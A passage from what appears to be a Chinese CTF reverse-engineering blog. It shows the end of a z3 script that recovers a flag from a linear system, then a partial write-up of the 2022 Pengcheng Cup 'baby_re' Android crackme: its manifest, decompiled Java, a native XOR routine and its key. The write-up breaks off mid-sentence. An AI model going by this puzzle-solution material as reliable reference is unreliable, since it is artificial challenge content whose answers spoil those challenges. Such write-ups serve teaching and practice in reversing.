class="number">86</span>, <span class="number">114</span>, <span class="number">62</span>, <span class="number">44</span>, <span class="number">42</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">73</span>, <span class="number">113</span>, <span class="number">99</span>, <span class="number">39</span>, <span class="number">112</span>, <span class="number">92</span>, <span class="number">34</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">110</span>, <span class="number">56</span>, <span class="number">81</span>, <span class="number">75</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">126</span>, <span class="number">112</span>, <span class="number">40</span>, <span class="number">72</span>, <span class="number">64</span>, <span class="number">76</span>, <span class="number">52</span>],</span><br><span class="line">[<span class="number">110</span>, <span class="number">34</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">35</span>, <span class="number">56</span>, <span class="number">38</span>, <span class="number">84</span>, <span class="number">124</span>, <span class="number">103</span>, <span class="number">49</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">122</span>, <span class="number">125</span>, <span class="number">38</span>, <span class="number">97</span>, <span class="number">71</span>, <span class="number">49</span>, <span class="number">122</span>, <span class="number">104</span>, <span class="number">126</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">80</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">74</span>, <span class="number">123</span>, <span class="number">46</span>],</span><br><span class="line">[<span class="number">87</span>, <span class="number">58</span>, <span class="number">49</span>, <span class="number">63</span>, <span class="number">86</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">85</span>, <span class="number">75</span>, <span class="number">40</span>, <span class="number">63</span>, <span class="number">86</span>, <span class="number">43</span>, <span class="number">117</span>, <span class="number">66</span>, <span class="number">54</span>, <span class="number">92</span>, <span class="number">118</span>, <span class="number">76</span>, <span class="number">68</span>, <span class="number">40</span>, <span class="number">97</span>, <span class="number">102</span>, <span class="number">81</span>, <span class="number">117</span>, <span class="number">55</span>, <span class="number">34</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">86</span>, <span class="number">84</span>, <span class="number">64</span>],</span><br><span class="line">[<span class="number">40</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">55</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">52</span>, <span class="number">70</span>, <span class="number">80</span>, <span class="number">34</span>, <span class="number">49</span>, <span class="number">125</span>, <span class="number">65</span>, <span class="number">33</span>, <span class="number">106</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">116</span>, <span class="number">119</span>, <span class="number">36</span>, <span class="number">116</span>, <span class="number">66</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">96</span>, <span class="number">82</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">115</span>],</span><br><span class="line">[<span class="number">34</span>, <span class="number">43</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">88</span>, <span class="number">116</span>, <span class="number">75</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">110</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">103</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">42</span>, <span class="number">84</span>, <span class="number">116</span>, <span class="number">40</span>, <span class="number">115</span>, <span class="number">84</span>, <span class="number">68</span>, <span class="number">125</span>, <span class="number">92</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">110</span>, <span class="number">40</span>, <span class="number">124</span>, <span class="number">38</span>],</span><br><span class="line">[<span class="number">33</span>, <span class="number">93</span>, <span class="number">39</span>, <span class="number">44</span>, <span class="number">69</span>, <span class="number">54</span>, <span class="number">86</span>, <span class="number">59</span>, <span class="number">80</span>, <span class="number">92</span>, <span class="number">35</span>, <span class="number">45</span>, <span class="number">103</span>, <span class="number">96</span>, <span class="number">51</span>, <span class="number">111</span>, <span class="number">58</span>, <span class="number">79</span>, <span class="number">51</span>, <span class="number">124</span>, <span class="number">45</span>, <span class="number">59</span>, <span class="number">121</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">114</span>, <span class="number">41</span>, <span class="number">34</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">65</span>, <span class="number">41</span>],</span><br><span class="line">[<span class="number">71</span>, <span class="number">70</span>, <span class="number">106</span>, <span class="number">46</span>, <span class="number">51</span>, <span class="number">66</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">55</span>, <span class="number">42</span>, <span class="number">88</span>, <span class="number">113</span>, <span class="number">33</span>, <span class="number">51</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">127</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">101</span>, <span class="number">40</span>, <span class="number">57</span>, <span class="number">63</span>, <span class="number">113</span>, <span class="number">90</span>, <span class="number">100</span>],</span><br><span class="line">[<span class="number">72</span>, <span class="number">86</span>, <span class="number">41</span>, <span class="number">125</span>, <span class="number">49</span>, <span class="number">67</span>, <span class="number">63</span>, <span class="number">127</span>, <span class="number">52</span>, <span class="number">106</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">63</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">87</span>, <span class="number">99</span>, <span class="number">63</span>, <span class="number">39</span>, <span class="number">122</span>, <span class="number">105</span>, <span class="number">62</span>, <span class="number">46</span>, <span class="number">123</span>, <span class="number">108</span>, <span class="number">127</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">83</span>, <span class="number">79</span>, <span class="number">48</span>, <span class="number">62</span>],</span><br><span class="line">[<span class="number">49</span>, <span class="number">83</span>, <span class="number">46</span>, <span class="number">113</span>, <span class="number">119</span>, <span class="number">39</span>, <span class="number">109</span>, <span class="number">96</span>, <span class="number">101</span>, <span class="number">73</span>, <span class="number">82</span>, <span class="number">124</span>, <span class="number">109</span>, <span class="number">93</span>, <span class="number">48</span>, <span class="number">82</span>, <span class="number">96</span>, <span class="number">126</span>, <span class="number">105</span>, <span class="number">37</span>, <span class="number">90</span>, <span class="number">86</span>, <span class="number">116</span>, <span class="number">115</span>, <span class="number">53</span>, <span class="number">32</span>, <span class="number">106</span>, <span class="number">92</span>, <span class="number">33</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">68</span>],</span><br><span class="line">[<span class="number">67</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">65</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">33</span>, <span class="number">119</span>, <span class="number">116</span>, <span class="number">35</span>, <span class="number">61</span>, <span class="number">55</span>, <span class="number">70</span>, <span class="number">117</span>, <span class="number">120</span>, <span class="number">105</span>, <span class="number">98</span>, <span class="number">37</span>, <span class="number">83</span>, <span class="number">64</span>, <span class="number">88</span>, <span class="number">119</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">49</span>, <span class="number">78</span>, <span class="number">93</span>],</span><br><span class="line">[<span class="number">34</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">33</span>, <span class="number">71</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">93</span>, <span class="number">104</span>, <span class="number">39</span>, <span class="number">70</span>, <span class="number">53</span>, <span class="number">96</span>, <span class="number">109</span>, <span class="number">119</span>, <span class="number">73</span>, <span class="number">58</span>, <span class="number">111</span>, <span class="number">122</span>, <span class="number">125</span>, <span class="number">91</span>, <span class="number">66</span>, <span class="number">70</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">42</span>, <span class="number">48</span>, <span class="number">85</span>, <span class="number">62</span>, <span class="number">97</span>, <span class="number">94</span>, <span class="number">97</span>],</span><br><span class="line">[<span class="number">119</span>, <span class="number">96</span>, <span class="number">75</span>, <span class="number">59</span>, <span class="number">115</span>, <span class="number">33</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">84</span>, <span class="number">45</span>, <span class="number">112</span>, <span class="number">60</span>, <span class="number">87</span>, <span class="number">117</span>, <span class="number">66</span>, <span class="number">106</span>, <span class="number">113</span>, <span class="number">59</span>, <span class="number">105</span>, <span class="number">40</span>, <span class="number">94</span>, <span class="number">87</span>, <span class="number">93</span>, <span class="number">64</span>, <span class="number">52</span>, <span class="number">39</span>, <span class="number">109</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">33</span>],</span><br><span class="line">[<span class="number">115</span>, <span class="number">113</span>, <span class="number">50</span>, <span class="number">95</span>, <span class="number">42</span>, <span class="number">88</span>, <span class="number">119</span>, <span class="number">59</span>, <span class="number">86</span>, <span class="number">127</span>, <span class="number">79</span>, <span class="number">89</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">64</span>, <span class="number">112</span>, <span class="number">68</span>, <span class="number">102</span>, <span class="number">45</span>, <span class="number">39</span>, <span class="number">63</span>, <span class="number">95</span>, <span class="number">35</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">110</span>, <span class="number">43</span>, <span class="number">56</span>, <span class="number">67</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">125</span>],</span><br><span class="line">[<span class="number">78</span>, <span class="number">83</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">50</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">52</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">60</span>, <span class="number">84</span>, <span class="number">54</span>, <span class="number">118</span>, <span class="number">91</span>, <span class="number">100</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">97</span>, <span class="number">96</span>, <span class="number">127</span>, <span class="number">79</span>, <span class="number">94</span>, <span class="number">77</span>, <span class="number">76</span>, <span class="number">118</span>, <span class="number">49</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">125</span>, <span class="number">73</span>, <span class="number">77</span>],</span><br><span class="line">[<span class="number">103</span>, <span class="number">45</span>, <span class="number">119</span>, <span class="number">36</span>, <span class="number">94</span>, <span class="number">99</span>, <span class="number">81</span>, <span class="number">35</span>, <span class="number">97</span>, <span class="number">51</span>, <span class="number">107</span>, <span class="number">110</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">64</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">33</span>, <span class="number">120</span>, <span class="number">89</span>, <span class="number">114</span>, <span class="number">36</span>, <span class="number">110</span>, <span class="number">80</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">105</span>, <span class="number">37</span>, <span class="number">66</span>, <span class="number">73</span>, <span class="number">91</span>, <span class="number">59</span>],</span><br><span class="line">[<span class="number">122</span>, <span class="number">56</span>, <span class="number">111</span>, <span class="number">52</span>, <span class="number">33</span>, <span class="number">118</span>, <span class="number">89</span>, <span class="number">105</span>, <span class="number">61</span>, <span class="number">117</span>, <span class="number">60</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">52</span>, <span class="number">63</span>, <span class="number">57</span>, <span class="number">124</span>, <span class="number">109</span>, <span class="number">64</span>, <span class="number">47</span>, <span class="number">52</span>, <span class="number">98</span>, <span class="number">96</span>, <span class="number">60</span>, <span class="number">86</span>, <span class="number">45</span>, <span class="number">51</span>, <span class="number">86</span>, <span class="number">123</span>, <span class="number">70</span>, <span class="number">104</span>, <span class="number">110</span>],</span><br><span class="line">[<span class="number">51</span>, <span class="number">127</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">44</span>, <span class="number">118</span>, <span class="number">89</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">87</span>, <span class="number">103</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">102</span>, <span class="number">100</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">55</span>, <span class="number">58</span>, <span class="number">43</span>, <span class="number">76</span>, <span class="number">115</span>, <span class="number">81</span>, <span class="number">68</span>, <span class="number">123</span>, <span class="number">69</span>, <span class="number">48</span>, <span class="number">66</span>, <span class="number">74</span>, <span class="number">83</span>, <span class="number">119</span>],</span><br><span class="line">[<span class="number">79</span>, <span class="number">55</span>, <span class="number">88</span>, <span class="number">105</span>, <span class="number">81</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">34</span>, <span class="number">87</span>, <span class="number">68</span>, <span class="number">36</span>, <span class="number">74</span>, <span class="number">48</span>, <span class="number">70</span>, <span class="number">57</span>, <span class="number">39</span>, <span class="number">125</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">61</span>, <span class="number">127</span>, <span class="number">82</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">120</span>, <span class="number">35</span>, <span class="number">126</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">104</span>]]</span><br><span class="line">ahhhhh = [</span><br><span class="line">[<span class="number">195075</span>],[<span class="number">164766</span>],[<span class="number">168447</span>],[<span class="number">176014</span>],</span><br><span class="line">[<span class="number">161107</span>],[<span class="number">175809</span>],[<span class="number">178310</span>],[<span class="number">189827</span>],</span><br><span class="line">[<span class="number">181204</span>],[<span class="number">182314</span>],[<span class="number">168177</span>],[<span class="number">196996</span>],</span><br><span class="line">[<span class="number">185129</span>],[<span class="number">152876</span>],[<span class="number">171067</span>],[<span class="number">185573</span>],</span><br><span class="line">[<span class="number">166900</span>],[<span class="number">184588</span>],[<span class="number">182162</span>],[<span class="number">148593</span>],</span><br><span class="line">[<span class="number">180204</span>],[<span class="number">169933</span>],[<span class="number">182766</span>],[<span class="number">166651</span>],</span><br><span class="line">[<span class="number">178856</span>],[<span class="number">175376</span>],[<span class="number">187367</span>],[<span class="number">182885</span>],</span><br><span class="line">[<span class="number">177145</span>],[<span class="number">189716</span>],[<span class="number">169531</span>],[<span class="number">178924</span>]]</span><br><span class="line">f=Solver()</span><br><span class="line"><span class="keyword">for</span> ohh <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    thats=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> gooood <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        thats+=(flag[gooood])*wow[ohh][gooood]</span><br><span class="line">    f.add(thats==ahhhhh[ohh][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">while</span>(f.check()==sat):</span><br><span class="line">    condition = []</span><br><span class="line">    m = f.model()</span><br><span class="line">    p=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        p+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">        condition.append(flag[i]!=<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[flag[i]])))</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    f.add(Or(condition))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>鹏城杯 2022 baby_re</title>
    <url>/2023/06/07/CTF%20WP/Re/%E5%AE%89%E5%8D%93/%E9%B9%8F%E5%9F%8E%E6%9D%AF%202022%20baby_re/</url>
    <content><![CDATA[<p>xml中仅有一个activity组件</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.example.createso&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;32&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.CreateSo&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.createso.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.createso;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> com.example.createso.databinding.ActivityMainBinding;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.IntStream;</span><br><span class="line"><span class="keyword">import</span> kotlin.Metadata;</span><br><span class="line"><span class="keyword">import</span> kotlin.jvm.internal.DefaultConstructorMarker;</span><br><span class="line"><span class="keyword">import</span> kotlin.jvm.internal.Intrinsics;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: MainActivity.kt */</span></span><br><span class="line"><span class="meta">@Metadata(d1 = &#123;&quot;\u0000(\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0015\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\u0018\u0000 \f2\u00020\u0001:\u0001\fB\u0005¢\u0006\u0002\u0010\u0002J\u0011\u0010\u0005\u001a\u00020\u00062\u0006\u0010\u0007\u001a\u00020\u0006H\u0086 J\u0012\u0010\b\u001a\u00020\t2\b\u0010\n\u001a\u0004\u0018\u00010\u000bH\u0015R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000¨\u0006\r&quot;&#125;, d2 = &#123;&quot;Lcom/example/createso/MainActivity;&quot;, &quot;Landroidx/appcompat/app/AppCompatActivity;&quot;, &quot;()V&quot;, &quot;binding&quot;, &quot;Lcom/example/createso/databinding/ActivityMainBinding;&quot;, &quot;baby_xor&quot;, &quot;&quot;, &quot;x&quot;, &quot;onCreate&quot;, &quot;&quot;, &quot;savedInstanceState&quot;, &quot;Landroid/os/Bundle;&quot;, &quot;Companion&quot;, &quot;app_debug&quot;&#125;, k = 1, mv = &#123;1, 6, 0&#125;, xi = 48)</span></span><br><span class="line"><span class="meta">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="meta">public final class MainActivity extends AppCompatActivity &#123;</span></span><br><span class="line"><span class="meta">    public static final Companion Companion = new Companion(null);</span></span><br><span class="line"><span class="meta">    public Map&lt;Integer, View&gt; _$_findViewCache = new LinkedHashMap();</span></span><br><span class="line"><span class="meta">    private ActivityMainBinding binding;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    public void _$_clearFindViewByIdCache() &#123;</span></span><br><span class="line"><span class="meta">        this._$_findViewCache.clear();</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    public View _$_findCachedViewById(int i) &#123;</span></span><br><span class="line"><span class="meta">        Map&lt;Integer, View&gt; map = this._$_findViewCache;</span></span><br><span class="line"><span class="meta">        View view = map.get(Integer.valueOf(i));</span></span><br><span class="line"><span class="meta">        if (view == null) &#123;</span></span><br><span class="line"><span class="meta">            View findViewById = findViewById(i);</span></span><br><span class="line"><span class="meta">            if (findViewById != null) &#123;</span></span><br><span class="line"><span class="meta">                map.put(Integer.valueOf(i), findViewById);</span></span><br><span class="line"><span class="meta">                return findViewById;</span></span><br><span class="line"><span class="meta">            &#125;</span></span><br><span class="line"><span class="meta">            return null;</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="meta">        return view;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    public final native int[] baby_xor(int[] iArr);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    /* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line"><span class="meta">    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line"><span class="meta">    public void onCreate(Bundle savedInstanceState) &#123;</span></span><br><span class="line"><span class="meta">        super.onCreate(savedInstanceState);</span></span><br><span class="line"><span class="meta">        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());</span></span><br><span class="line"><span class="meta">        Intrinsics.checkNotNullExpressionValue(inflate, &quot;inflate(layoutInflater)&quot;);</span></span><br><span class="line"><span class="meta">        this.binding = inflate;</span></span><br><span class="line"><span class="meta">        if (inflate == null) &#123;</span></span><br><span class="line"><span class="meta">            Intrinsics.throwUninitializedPropertyAccessException(&quot;binding&quot;);</span></span><br><span class="line"><span class="meta">            inflate = null;</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="meta">        setContentView(inflate.getRoot());</span></span><br><span class="line"><span class="meta">        final int[] c = &#123;119, 9, 40, 44, 106, 83, 126, 123, 33, 87, 113, 123, 112, 93, 125, 127, 41, 82, 44, 127, 39, 3, 126, 125, 119, 87, 47, 125, 33, 6, 44, 127, 112, 0, 126, 123, 115, 24&#125;;</span></span><br><span class="line"><span class="meta">        ((Button) _$_findCachedViewById(R.id.btn)).setOnClickListener(new View.OnClickListener() &#123; // from class: com.example.createso.MainActivity$$ExternalSyntheticLambda0</span></span><br><span class="line"><span class="meta">            @Override // android.view.View.OnClickListener</span></span><br><span class="line"><span class="meta">            public final void onClick(View view) &#123;</span></span><br><span class="line"><span class="meta">                MainActivity.m26onCreate$lambda0(MainActivity.this, c, view);</span></span><br><span class="line"><span class="meta">            &#125;</span></span><br><span class="line"><span class="meta">        &#125;);</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    /* JADX INFO: Access modifiers changed from: private */</span></span><br><span class="line"><span class="meta">    /* renamed from: onCreate$lambda-0  reason: not valid java name */</span></span><br><span class="line"><span class="meta">    public static final void m26onCreate$lambda0(MainActivity this$0, int[] c, View it) &#123;</span></span><br><span class="line"><span class="meta">        Intrinsics.checkNotNullParameter(this$0, &quot;this$0&quot;);</span></span><br><span class="line"><span class="meta">        Intrinsics.checkNotNullParameter(c, &quot;$c&quot;);</span></span><br><span class="line"><span class="meta">        IntStream flag = ((EditText) this$0._$_findCachedViewById(R.id.input)).getText().toString().chars();</span></span><br><span class="line"><span class="meta">        int[] array = flag.toArray();</span></span><br><span class="line"><span class="meta">        Intrinsics.checkNotNullExpressionValue(array, &quot;flag.toArray()&quot;);</span></span><br><span class="line"><span class="meta">        int[] cipher = this$0.baby_xor(array);//调用了动态类的内部函数baby_xor,对flag进行加密</span></span><br><span class="line"><span class="meta">        if (Arrays.equals(cipher, c)) &#123;</span></span><br><span class="line"><span class="meta">            Toast.makeText(this$0, &quot;Success&quot;, 1).show();</span></span><br><span class="line"><span class="meta">        &#125; else &#123;</span></span><br><span class="line"><span class="meta">            Toast.makeText(this$0, &quot;Failed&quot;, 0).show();</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    /* compiled from: MainActivity.kt */</span></span><br><span class="line"><span class="meta">    @Metadata(d1 = &#123;&quot;\u0000\f\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002¨\u0006\u0003&quot;&#125;, d2 = &#123;&quot;Lcom/example/createso/MainActivity$Companion;&quot;, &quot;&quot;, &quot;()V&quot;, &quot;app_debug&quot;&#125;, k = 1, mv = &#123;1, 6, 0&#125;, xi = 48)</span></span><br><span class="line"><span class="meta">    /* loaded from: classes3.dex */</span></span><br><span class="line"><span class="meta">    public static final class Companion &#123;</span></span><br><span class="line"><span class="meta">        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) &#123;</span></span><br><span class="line"><span class="meta">            this();</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">        private Companion() &#123;</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    static &#123;</span></span><br><span class="line"><span class="meta">        System.loadLibrary(&quot;createso&quot;);//加载了lib中的库文件</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>查看对应的库，就是一个用key对传入字符进行加密的函数</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">Java_com_example_createso_MainActivity_baby_1xor</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+30h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> IntArrayElements; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> ArrayLength; <span class="comment">// [esp+38h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  ArrayLength = _JNIEnv::<span class="built_in">GetArrayLength</span>(a1, a3);</span><br><span class="line">  IntArrayElements = _JNIEnv::<span class="built_in">GetIntArrayElements</span>(a1, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; ArrayLength; ++i )</span><br><span class="line">    *(_DWORD *)(IntArrayElements + <span class="number">4</span> * i) ^= key[i % <span class="number">4</span>];</span><br><span class="line">  _JNIEnv::<span class="built_in">SetIntArrayRegion</span>(a1, a3, <span class="number">0</span>, ArrayLength, IntArrayElements);</span><br><span class="line">  <span class="keyword">return</span> a3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/************************************************进去看key值*******************************************************/</span></span><br><span class="line">.data:<span class="number">00002000</span> ; _DWORD key[<span class="number">4</span>]</span><br><span class="line">.data:<span class="number">00002000</span> key             dd <span class="number">56</span>h, <span class="number">57</span>h, <span class="number">58</span>h, <span class="number">59</span>h   ; DATA XREF: LOAD:<span class="number">00000290</span>↑o</span><br><span class="line">.data:<span class="number">00002000</span>                                         ; .got:key_ptr↑o</span><br><span class="line">.data:<span class="number">00002000</span> _data           ends</span><br><span class="line">.data:<span class="number">00002000</span></span><br></pre></td></tr></table></figure></div>

<p>在用上述的key值进行异或时，并不能得出正确答案。</p>
<p>然后偷窥别人的wp，发现有个</p>
